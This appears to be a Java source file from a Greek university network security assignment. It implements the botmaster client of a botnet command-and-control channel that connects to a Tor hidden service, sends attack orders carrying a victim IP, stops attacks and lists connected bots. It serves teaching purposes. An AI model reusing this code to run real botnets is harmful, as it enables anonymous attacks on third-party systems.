/**
 *    Ασφάλεια Δικτύων Υπολογιστών & Τεχνολογίες Προστασίας της Ιδιωτικότητας
 *                                   Άσκηση 2
 * Δημιουργία ασφαλούς διαύλου διαχείρισης botnet (C&C) με αξιοποίηση Tor και 
 * χρήση πρωτοκόλλου διασφάλισης εμπιστευτικότητας και ακεραιότητας
 * 
 *                      Πέππας Κωνσταντίνος 321/2011134
 *                      Σωτηρέλης Χρήστος   321/2012182
 *                      Χαϊκάλης Νικόλαος   321/2012200
 * 
 */

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import org.silvertunnel_ng.netlib.api.NetFactory;
import org.silvertunnel_ng.netlib.api.NetLayer;
import org.silvertunnel_ng.netlib.api.NetLayerIDs;
import org.silvertunnel_ng.netlib.api.NetSocket;
import org.silvertunnel_ng.netlib.api.util.TcpipNetAddress;


/**
 *Class pu edrewnw tin epikoinwnia me ton C&C Server kai anoigw to chat
 * metaksi tous. Stin class auti iparxun k methodoi start & stop tis
 * epikoinwnias.
 */
public class ChatWithCC_Server implements Serializable{
    private int port; //port epikoinwnias me ton C&C Server
    private NetSocket socket;
    private String CC_IP; //ip tou C&C Server
    private ObjectOutputStream oos;
    private ObjectInputStream ois;
    private boolean keepWalking = true;
    private Chat chating = new Chat();
    private Messages msgs = new Messages();
    private ArrayList<Bot_Properties> botList = new ArrayList();

    /** 
     * @param port
     * @param CC_IP 
     * Diavazw tis @params apo ton xristi otan thelei na dwsei
     * diaforetiko port k IP apo ta default.
     */
    public ChatWithCC_Server(int port, String CC_IP) {
        this.port = port;
        this.CC_IP = CC_IP;
    }
    
    /**
     * @param port 
     * otan o xristis thelei na dwsei mono diaforetiko port ara 
     * i CC_IP tha parei timi "localhost"
     */
    public ChatWithCC_Server(int port) {
        this.port = port;
        CC_IP = "localhost";
    }

    /**
     * @param CC_IP 
     * Otan o xristis thelei na dwsei mono diaforeretiki IP ara to port
     * to afinume default.
     */
    public ChatWithCC_Server(String CC_IP) {
        this.CC_IP = CC_IP;
        port = 5555;
    }
    
    /**
     * Default Constructor gia tis default times tis epikoinwnias mas
     */
    public ChatWithCC_Server(){
        CC_IP = "localhost";
        port = 5555;
    }
    
    /**
     * Methodos pou tin xrisimopoiw gia na edrewsw tin sindesi me ton
     * C&C Server
     */
    public boolean Start_Connection(){
        TOR();
        Chat_Thread.start();//ksekinaei to chat
        chating = new Chat(oos, ois, "BotMaster");
        chating.SendMessage(msgs.GreetingsServer());
        //chating.SendMessage(msgs.StopConnection());
        return true;
        
    }
    
    /**
     * Methodos gia na stamatisw tin sindesi me ton C&C Server.
     */
    public void Stop_Connection(){
        keepWalking = false;
        Chat_Thread.interrupt();
        try {
            if(oos != null) oos.close();
            if(ois != null) ois.close();
        } catch (IOException ex) {
            Logger.getLogger(ChatWithCC_Server.class.getName()).log(Level.SEVERE, null, ex);
        }
        try {
            if(socket !=null) socket.close();
        } catch (IOException ex) {
            Logger.getLogger(ChatWithCC_Server.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    public void SendAttack(Attack_Properties msg){
        chating.SendMessage(msg);
//        System.out.println(msg.getIP_Victim() + "paw gia chat.");
    }
    //Stop Attack method:
    public void StopAttack(){
        chating.SendMessage(msgs.StopAttack());
    }
    
    //Stop Connection:
    public void SendStop(){
        chating.SendMessage(msgs.StopConnection());
    }
    
    /**
     * Dimiourgia enos thread pou tha xrisimopoiisw tin class chat
     * prokeimenou na dimiurgisw ena chat metaksi tou BotMaster kai tou
     * C&C Server.
     */
    private Thread Chat_Thread = new Thread(() -> {
        while(keepWalking == true){
            Object readObj = chating.readMessage();

            /**
             * An o BotMaster stilei aitima na klisei tin sindesi k o Server tou apantisei
             * me "STOP_CONNECTION_WITH_THE_BOTMASTER" tote kleinw tin sindesi.
             */
            
            if(readObj.toString().equalsIgnoreCase(msgs.StopConnection())){
                Stop_Connection();
            }
            else if(readObj instanceof ArrayList){
                botList = (ArrayList<Bot_Properties>) readObj;
                if(!botList.isEmpty()){
                    for(int i=0; i<botList.size(); i++){
                        System.out.println(botList.get(i).getBotPCname());
                        System.out.println(botList.get(i).getBotIP());
                        System.out.println(botList.get(i).getOos());
                    }
                }
            }
            
            //sleep(300);
            //chating.SendMessage(msgs.StopConnection());
        }
    });
    
    private void TOR(){
        try {
            File file = new File("C:\\Users\\Alcohealism\\Documents\\NetBeansProjects\\Botnet TOR\\CnC (Server)\\onion\\hostname");
            BufferedReader br = new BufferedReader(new FileReader(file));
            // define remote address
            String remoteHostname = br.readLine();
            int remotePort = 5555;
            TcpipNetAddress remoteAddress = new TcpipNetAddress(remoteHostname, remotePort);
            // get TorNetLayer instance and wait until it is ready
            NetLayer netLayer = NetFactory.getInstance().getNetLayerById(NetLayerIDs.TOR);
            netLayer.waitUntilReady();
            // open connection to remote address - this connection is tunneled through the TOR anonymity network
            socket = netLayer.createNetSocket(null, null, remoteAddress);
            // send and receive data
            // hint: to avoid dead locks: use separate threads for each direction
            oos = new ObjectOutputStream(socket.getOutputStream());
            ois = new ObjectInputStream(socket.getInputStream());
        } catch (NullPointerException | IOException ex) {
            NewGUI();
            final JPanel panel = new JPanel();
            JOptionPane.showMessageDialog(panel, "Server is down or incorrect hostname.", "Error", JOptionPane.ERROR_MESSAGE);
            Stop_Connection();
            System.exit(0);
        }
    }
    
    //GETS:
    public int getPort() {
        return port;
    }

    public String getCC_IP() {
        return CC_IP;
    }

    public NetSocket getSocket() {
        return socket;
    }

    public ObjectOutputStream getOos() {
        return oos;
    }

    public ObjectInputStream getOis() {
        return ois;
    }

    public boolean keepWalking() {
        return keepWalking;
    }

    public ArrayList<Bot_Properties> getBotList() {
        return botList;
    }
    
    
    
    
    //SETS:
    public void setPort(int port) {
        this.port = port;
    }

    public void setCC_IP(String CC_IP) {
        this.CC_IP = CC_IP;
    }

    public void NetSocket(NetSocket socket) {
        this.socket = socket;
    }

    public void setOos(ObjectOutputStream oos) {
        this.oos = oos;
    }

    public void setOis(ObjectInputStream ois) {
        this.ois = ois;
    }

    public void keepWalking(boolean keepWalking) {
        this.keepWalking = keepWalking;
    }
    
    
    void NewGUI(){
        try {
        for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
            if ("Nimbus".equals(info.getName())) {
                javax.swing.UIManager.setLookAndFeel(info.getClassName());
                break;
            }
        }
        } catch (ClassNotFoundException | InstantiationException | IllegalAccessException | javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(GUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
    }
}
